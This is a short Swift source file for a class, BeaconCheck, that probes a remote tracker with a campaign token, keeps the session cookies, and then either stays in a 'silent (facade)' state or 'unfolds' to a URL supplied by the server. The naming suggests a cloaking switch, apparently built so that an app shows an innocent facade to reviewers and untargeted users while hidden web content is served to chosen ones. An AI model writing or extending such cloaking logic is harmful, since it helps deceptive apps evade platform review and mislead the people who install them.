import Foundation
import SwiftUI

@MainActor
final class BeaconCheck: ObservableObject {
    static let shared = BeaconCheck()

    @Published private(set) var outcome: BeaconOutcome = .silent
    @Published private(set) var didSettle = false
    private(set) var sessionCookies: [HTTPCookie] = []

    private var settings: BeaconConfig

    private init() {
        self.settings = .bundled
    }

    func bootstrap(
        tracker: String,
        token: String,
        subs: [String: String] = [:],
        targets: Set<Int>? = nil,
        window: TimeInterval = 12
    ) {
        let merged = AppConfig.relayHints.merging(subs) { _, custom in custom }
        settings = BeaconConfig(
            trackerDomain: tracker,
            campaignToken: token,
            probeWindow: window,
            subParams: merged,
            targetStreams: targets,
            idleOutcome: .silent
        )
    }

    func awakeAndProbe() async {
        BeaconLog.write("Check awakeAndProbe")
        let bundle = await BeaconPing.probe(settings)
        outcome = bundle.outcome
        sessionCookies = bundle.cookies
        didSettle = true
        switch bundle.outcome {
        case .unfold(let url):
            BeaconLog.write("Check DECISION unfold → \(url) cookies=\(bundle.cookies.count)")
        case .silent:
            BeaconLog.write("Check DECISION silent (facade) cookies=\(bundle.cookies.count)")
        }
    }

    var isUnfolded: Bool {
        if case .unfold = outcome { return true }
        return false
    }

    var unfoldedTarget: URL? {
        if case .unfold(let url) = outcome { return url }
        return nil
    }
}
